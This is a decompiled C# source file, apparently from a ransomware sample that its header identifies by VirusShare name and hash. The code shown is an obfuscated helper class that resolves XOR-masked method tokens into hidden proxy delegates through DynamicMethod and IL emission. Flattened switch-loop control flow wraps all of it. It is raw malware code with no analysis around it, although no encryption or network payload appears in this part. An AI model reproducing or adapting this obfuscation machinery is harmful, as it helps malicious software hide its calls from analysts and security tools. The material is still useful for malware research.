// Decompiled with JetBrains decompiler
// Type: 
// Assembly: Tonight, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: ECD5EA59-CE2E-4828-8FD2-E2AF0CF5AF63
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.Win32.Agent.gen-c0aaa6f632652bce8fbd7bd512951bb1bc516f41e8be66d63de1bd226dd865eb.exe

using System;
using System.Reflection;
using System.Reflection.Emit;

internal class \uE003
{
  private static ModuleHandle \uE000 = Assembly.GetExecutingAssembly().ManifestModule.ModuleHandle;

  public static void \uE000(RuntimeTypeHandle _param0, int _param1, RuntimeFieldHandle _param2)
  {
    FieldInfo fieldFromHandle = FieldInfo.GetFieldFromHandle(_param2);
label_2:
    int num = -22;
    Type typeFromHandle;
    MethodInfo methodFromHandle;
    while (true)
    {
      switch ((num ^ 83) + 72)
      {
        case 0:
          \uE003.\uE004(fieldFromHandle, typeFromHandle, methodFromHandle);
          num = -24;
          continue;
        case 1:
          typeFromHandle = Type.GetTypeFromHandle(_param0);
          num = -23;
          continue;
        case 2:
          methodFromHandle = (MethodInfo) MethodBase.GetMethodFromHandle(\uE003.\uE000.ResolveMethodHandle(_param1 ^ 722388838));
          num = -21;
          continue;
        case 3:
          goto label_5;
        default:
          goto label_2;
      }
    }
label_5:;
  }

  public static void \uE001(
    RuntimeTypeHandle _param0,
    int _param1,
    int _param2,
    RuntimeFieldHandle _param3)
  {
    FieldInfo fieldFromHandle = FieldInfo.GetFieldFromHandle(_param3);
label_2:
    int num = 4;
    Type typeFromHandle;
    MethodInfo methodFromHandle;
    while (true)
    {
      switch (num ^ 74)
      {
        case 78:
          typeFromHandle = Type.GetTypeFromHandle(_param0);
          num = 5;
          continue;
        case 79:
          methodFromHandle = (MethodInfo) MethodBase.GetMethodFromHandle(\uE003.\uE000.ResolveMethodHandle(_param1 ^ 722388838), \uE003.\uE000.ResolveTypeHandle(_param2 ^ 1783276592));
          num = 26;
          continue;
        case 80:
          \uE003.\uE004(fieldFromHandle, typeFromHandle, methodFromHandle);
          num = 27;
          continue;
        case 81:
          goto label_5;
        default:
          goto label_2;
      }
    }
label_5:;
  }

  public static void \uE002(RuntimeTypeHandle _param0, int _param1, RuntimeFieldHandle _param2)
  {
    FieldInfo fieldFromHandle = FieldInfo.GetFieldFromHandle(_param2);
label_2:
    int num = -30;
    Type typeFromHandle;
    ConstructorInfo methodFromHandle;
    while (true)
    {
      switch ((num ^ 82) + 80)
      {
        case 0:
          typeFromHandle = Type.GetTypeFromHandle(_param0);
          num = -32;
          continue;
        case 1:
          \uE003.\uE005(fieldFromHandle, typeFromHandle, methodFromHandle);
          num = -31;
          continue;
        case 2:
          methodFromHandle = (ConstructorInfo) MethodBase.GetMethodFromHandle(\uE003.\uE000.ResolveMethodHandle(_param1 ^ 570250091));
          num = -29;
          continue;
        case 3:
          goto label_5;
        default:
          goto label_2;
      }
    }
label_5:;
  }

  public static void \uE003(
    RuntimeTypeHandle _param0,
    int _param1,
    int _param2,
    RuntimeFieldHandle _param3)
  {
    FieldInfo fieldFromHandle = FieldInfo.GetFieldFromHandle(_param3);
label_2:
    int num = 7;
    Type typeFromHandle;
    ConstructorInfo constructorInfo;
    while (true)
    {
      switch (num ^ 79)
      {
        case 72:
          typeFromHandle = Type.GetTypeFromHandle(_param0);
          num = 5;
          continue;
        case 73:
          \uE003.\uE005(fieldFromHandle, typeFromHandle, constructorInfo);
          num = 4;
          continue;
        case 74:
          ConstructorInfo methodFromHandle;
          constructorInfo = methodFromHandle = (ConstructorInfo) MethodBase.GetMethodFromHandle(\uE003.\uE000.ResolveMethodHandle(_param1 ^ 570250091), \uE003.\uE000.ResolveTypeHandle(_param2 ^ 1783276592));
          num = 6;
          continue;
        case 75:
          goto label_5;
        default:
          goto label_2;
      }
    }
label_5:;
  }

  private static void \uE004(FieldInfo _param0, Type _param1, MethodInfo _param2)
  {
    Delegate @delegate;
    if ((!_param2.IsStatic ? 1 : 0) == 0)
    {
      @delegate = Delegate.CreateDelegate(_param0.FieldType, _param2);
    }
    else
    {
      ParameterInfo[] parameters = _param2.GetParameters();
label_6:
      int num1 = 4;
      int num2 = -6;
      int length;
      Type[] parameterTypes;
      while (true)
      {
        switch ((num2 ^ 74) + 82)
        {
          case 0:
            goto label_6;
          case 1:
            switch (num1)
            {
              case 72:
                if (_param2.DeclaringType.IsValueType)
                {
                  num1 = 6;
                  goto label_3;
                }
                else
                  goto label_14;
              case 73:
                length = parameters.Length + 1;
                num1 = 7;
                goto label_3;
              case 74:
                parameterTypes = new Type[length];
                num1 = 5;
                goto label_3;
              case 75:
                goto label_13;
              default:
                num2 = -28;
                continue;
            }
          case 2:
label_3:
            num1 ^= 77;
            break;
        }
        num2 = -27;
      }
label_13:
      int num3 = 0;
      goto label_15;
label_14:
      num3 = 1;
label_15:
      parameterTypes[0] = num3 != 0 ? typeof (object) : _param2.DeclaringType.MakeByRefType();
      int index = 1;
      if (index != 0)
        goto label_17;
label_16:
      parameterTypes[index] = parameters[index - 1].ParameterType;
      ++index;
label_17:
      if (index >= length)
      {
        DynamicMethod dynamicMethod = new DynamicMethod(string.Empty, _param2.ReturnType, parameterTypes, _param1, true);
label_20:
        int num4 = -5;
        ILGenerator ilGenerator;
        while (true)
        {
          int num5;
          int num6;
          switch ((num4 ^ 71) + 73)
          {
            case 0:
              switch (num5)
              {
                case 1:
                  ilGenerator.Emit(OpCodes.Ldarg_1);
                  break;
                case 2:
                  ilGenerator.Emit(OpCodes.Ldarg_2);
                  break;
                case 3:
                  ilGenerator.Emit(OpCodes.Ldarg_3);
                  break;
                default:
                  num4 = -6;
                  continue;
              }
              break;
            case 1:
              ilGenerator.Emit(OpCodes.Ldarg_0);
              num4 = -4;
              continue;
            case 2:
label_24:
              num5 = num6;
              num4 = -16;
              continue;
            case 3:
              if (num6 == 0)
              {
                num4 = -2;
                continue;
              }
              goto label_34;
            case 4:
              num6 = 1;
              num4 = -3;
              continue;
            case 5:
              ilGenerator = dynamicMethod.GetILGenerator();
              num4 = -1;
              continue;
            case 6:
              ilGenerator.Emit(OpCodes.Ldarg_S, num6);
              break;
            default:
              goto label_20;
          }
          ++num6;
label_34:
          if (num6 < length)
            goto label_24;
          else
            break;
        }
        ilGenerator.Emit((!_param0.IsAssembly ? 0 : 1) != 0 ? OpCodes.Callvirt : OpCodes.Call, _param2);
        ilGenerator.Emit(OpCodes.Ret);
        @delegate = dynamicMethod.CreateDelegate(_param1);
      }
      else
        goto label_16;
    }
    _param0.SetValue((object) null, (object) @delegate);
  }

  private static void \uE005(FieldInfo _param0, Type _param1, ConstructorInfo _param2)
  {
    ParameterInfo[] parameters = _param2.GetParameters();
    int length = parameters.Length;
    Type[] parameterTypes = new Type[length];
    int index = 0;
    if (index == 0)
      goto label_2;
label_1:
    parameterTypes[index] = parameters[index].ParameterType;
    ++index;
label_2:
    if (index >= length)
    {
      DynamicMethod dynamicMethod = new DynamicMethod(string.Empty, _param2.DeclaringType, parameterTypes, _param1, true);
label_7:
      int num1 = -9;
      int num2 = -5;
      ILGenerator ilGenerator;
      while (true)
      {
        switch ((num2 ^ 72) + 79)
        {
          case 0:
            goto label_7;
          case 1:
            int num3;
            int num4;
            switch (num1 + 73)
            {
              case 0:
label_10:
                num4 = num3;
                num1 = -10;
                goto label_4;
              case 1:
                if (num3 != 0)
                {
                  num1 = -5;
                  goto label_4;
                }
                else
                  goto label_23;
              case 2:
                num3 = 0;
                num1 = -12;
                goto label_4;
              case 3:
                switch (num4)
                {
                  case 0:
                    ilGenerator.Emit(OpCodes.Ldarg_0);
                    break;
                  case 1:
                    ilGenerator.Emit(OpCodes.Ldarg_1);
                    break;
                  case 2:
                    ilGenerator.Emit(OpCodes.Ldarg_2);
                    break;
                  case 3:
                    ilGenerator.Emit(OpCodes.Ldarg_3);
                    break;
                  default:
                    num1 = -16;
                    goto label_4;
                }
                break;
              case 4:
                ilGenerator = dynamicMethod.GetILGenerator();
                num1 = -11;
                goto label_4;
              case 5:
                ilGenerator.Emit(OpCodes.Ldarg_S, num3);
                break;
              default:
                num2 = -7;
                continue;
            }
            ++num3;
label_23:
            if (num3 < length)
              goto label_10;
            else
              goto label_24;
          case 2:
label_4:
            num1 ^= 76;
            break;
        }
        num2 = -6;
      }
label_24:
      ilGenerator.Emit(OpCodes.Newobj, _param2);
label_27:
      int num5 = 25;
      Delegate @delegate;
      while (true)
      {
        switch (num5 ^ 74)
        {
          case 83:
            ilGenerator.Emit(OpCodes.Ret);
            num5 = 31;
            continue;
          case 84:
            _param0.SetValue((object) null, (object) @delegate);
            num5 = 28;
            continue;
          case 85:
            @delegate = dynamicMethod.CreateDelegate(_param1);
            num5 = 30;
            continue;
          case 86:
            goto label_26;
          default:
            goto label_27;
        }
      }
label_26:;
    }
    else
      goto label_1;
  }
}
